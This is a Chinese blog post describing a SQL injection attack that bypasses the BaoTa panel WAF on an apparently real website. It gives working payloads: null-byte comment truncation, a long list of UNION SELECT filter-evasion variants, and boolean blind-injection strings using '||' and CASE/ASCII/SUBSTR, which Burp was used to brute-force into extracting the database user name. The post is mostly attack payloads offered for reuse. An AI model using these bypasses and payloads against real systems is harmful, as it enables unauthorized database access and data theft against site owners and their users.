> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/weixin_48421613/article/details/115181668)

#### 一次宝塔 sql 注入绕过

*   [宝塔防护](#_2)
*   *   [sql 注入尝试](#sql_6)
    *   [联合查询的尝试](#_35)
    *   [布尔盲注尝试](#_153)
    *   [真假盲注运用](#_178)

宝塔防护
----

在一次挖 cvnd 漏洞的时候，遇到了宝塔面板的防护，此 waf 屏蔽了传统的注释符 “–+”、"#"、 “/*” ， union select 做了防护而且似乎还做了过滤，废了半天劲绕过去发现联合查询不能被执行了，order by 虽然能用但是也没了卵用，搞了半天搞了个寂寞，正当我就要放弃的时候，我想起了使用布尔盲注，结果… 玛德法克…

### sql 注入尝试

老生常谈了哈，日站第一步当然需要确定是不是真的存在 sql 注入

1.  **输入单引号进行注入测试**  
    首先页面是这个样子的 `?id=11`  
    ![](https://img-blog.csdnimg.cn/2021032415583656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)
    
2.  **输入测试 poyload 单引号**  
    输入单引号内容不见 `?id=11'`  
    ![](https://img-blog.csdnimg.cn/20210324155451828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)
    
3.  **再输入一个单引号进行闭合**  
    闭合单引号后数据重新出现，说明此处可能是基于单引号的盲注类型  
    `?id=11''`  
    ![](https://img-blog.csdnimg.cn/20210324155716149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)
    
4.  **注释符的尝试**  
    此防护为宝塔 waf 防护，输入 "-- -" 、"#" 、 “/*” 常见的注释符发现会直接被拦截，并且井字符并没卵用  
    ![](https://img-blog.csdnimg.cn/20210324160232942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)
    
5.  **注释符过滤不全**  
    此时我想起一个注释符 “;%00” 截断，发现，芜湖，直接起飞  
    `?id=11' ;%00`  
    ![](https://img-blog.csdnimg.cn/20210324160534635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)
    

### 联合查询的尝试

解决了注释符的问题，现在开始尝试联合查询，联合查询第一步当然是进行 order by 操作

1.  **order by 猜测字段个数**  
    使用二分法即可快速的猜测字段个数，在前几篇文章有详细介绍，在这里不做赘述，这里没有屏蔽 order by  
    `?id=11' order by 26 ;%00`  
    ![](https://img-blog.csdnimg.cn/20210324161505210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)![](https://img-blog.csdnimg.cn/20210324161609228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)
    
2.  **联合查询失败**  
    当我想使用联合查询的时候，发现 Union select 进去就会被拦截，大小写什么的，修改请求方式，内联注释，垃圾数据填充，编码转换都失败了，最后空字节可以，但是并不能被执行，所以很有可能是联合查询被过滤掉了  
    ![](https://img-blog.csdnimg.cn/20210324163646958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)不举太多例子了，结果都一样，那就是被拦截
    

`+#uNiOn+#sEleCt` 没拦截，但是也没好使，淦  
![](https://img-blog.csdnimg.cn/2021032416295779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)以下省略 n 多尝试，最后的结论就是联合查询不好使，绝望，附上联合查询的绕过方式

```
/*!%55NiOn*/ /*!%53eLEct*/
 
 %55nion(%53elect 1,2,3)-- -
 
 +union+distinct+select+
 
 +union+distinctROW+select+
 
 /**//*!12345UNION SELECT*//**/
 
 /**//*!50000UNION SELECT*//**/
 
 /**/UNION/**//*!50000SELECT*//**/
 
 /*!50000UniON SeLeCt*/
 
 union /*!50000%53elect*/
 
 +#uNiOn+#sEleCt
 
 +#1q%0AuNiOn all#qa%0A#%0AsEleCt
 
 /*!%55NiOn*/ /*!%53eLEct*/
 
 /*!u%6eion*/ /*!se%6cect*/
 
 +un/**/ion+se/**/lect
 
 uni%0bon+se%0blect
 
 %2f**%2funion%2f**%2fselect
 
 union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
 
 REVERSE(noinu)+REVERSE(tceles)
 
 /*--*/union/*--*/select/*--*/
 
 union (/*!/**/ SeleCT */ 1,2,3)
 
 /*!union*/+/*!select*/
 
 union+/*!select*/
 
 /**/union/**/select/**/
 
 /**/uNIon/**/sEleCt/**/
 
 /**//*!union*//**//*!select*//**/
 
 /*!uNIOn*/ /*!SelECt*/
 
 +union+distinct+select+
 
 +union+distinctROW+select+
 
 +UnIOn%0d%0aSeleCt%0d%0a
 
 UNION/*&test=1*/SELECT/*&pwn=2*/
 
 un?+un/**/ion+se/**/lect+
 
 +UNunionION+SEselectLECT+
 
 +uni%0bon+se%0blect+
 
 %252f%252a*/union%252f%252a /select%252f%252a*/
 
 /%2A%2A/union/%2A%2A/select/%2A%2A/
 
 %2f**%2funion%2f**%2fselect%2f**%2f
 
 union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
 
 /*!UnIoN*/SeLecT+
  %55nion(%53elect)
 
   union%20distinct%20select
 
   union%20%64istinctRO%57%20select
 
   union%2053elect
 
   %23?%0auion%20?%23?%0aselect
 
   %23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect
 
   %55nion %53eLEct
 
   u%6eion se%6cect
 
   unio%6e %73elect
 
   unio%6e%20%64istinc%74%20%73elect
 
   uni%6fn distinct%52OW s%65lect
 

   %75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%7
```

### 布尔盲注尝试

联合查询失败后，我想起我还会点布尔盲注，走一波

1.  **真假盲注测试**  
    使用真假盲注 and 1=1 or 1=1 进行真假盲注测试  
    `?id=11' and 1=1 ;%00`  
    额呵，被屏蔽了
    
2.  **再次转换**  
    尝试了 and -1=-1 and true or -1=-1 or false 依然被屏蔽  
    ![](https://img-blog.csdnimg.cn/2021032416384947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)  
    经过我的测试，此宝塔不会单独屏蔽 and 、 or 、= 但是当二者放在一块的时候就会被拦截，那么能不能绕过呢？
    
3.  **转换等号失败**  
    我最先想到的是转换等于号，进行 url 转换  
    ![](https://img-blog.csdnimg.cn/20210324164107814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)  
    很显然失败了，经过多轮转换都没行，我都要放弃了，这个时候我想起来逻辑运算符，等于不能转换，我可以转换 and 和 or 啊！
    
4.  **逻辑与转换失败**  
    逻辑与 and 等同于 &&  
    ![](https://img-blog.csdnimg.cn/20210324164728173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)
    

没好使  
4. **逻辑或转换**  
逻辑或 or 等同于 ||  
`?id=11' || not true ;%00`  
![](https://img-blog.csdnimg.cn/20210324164814437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)芜湖，成功了，我真是个小机灵鬼

### 真假盲注运用

1.  **用户长度的猜测**  
    `?id=11 || not length(user())=8 ;%00`  
    这条 payload 的作用就是结合逻辑与，当用户长度等于 8 的时候就位真，等同于 or not 8=8 也就会返回当前页面，利用这一点可以使用 burpsuite 进行暴力破解猜测用户名的长度，废话不多说，走你  
    ![](https://img-blog.csdnimg.cn/20210324165355732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)此时用户长度当然不是 8 所以是假的，所以页面发生了变化，上 burp  
    ![](https://img-blog.csdnimg.cn/20210324165453790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)得到用户名长度为 19  
    ![](https://img-blog.csdnimg.cn/20210324165532655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)
2.  **用户名的猜测**  
    `?id=11 || not 1=(case when ascii(substr(user(),1,1))=127 then 2 else 1 end);%00`  
    这条 payload 的作用就是逐一爆破用户名，利用了 ascii 转换以及三元运算，substr() 为字符串截取，和 mid() 有异曲同工之处；当第一位字符串为 ascii 对应的 127 时为真  
    ![](https://img-blog.csdnimg.cn/20210324165927460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)由于 ascii 中真正有用的其实就是 32-127，所以 payload 中只用到用户的长度 1-19 ，ascii 32-127  
    ![](https://img-blog.csdnimg.cn/202103241701074.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80ODQyMTYxMw==,size_16,color_FFFFFF,t_70)  
    将 ascii 按照顺序进行编码转换，得到用户名为  
    wxxxxxxxx@localhost

举例到此结束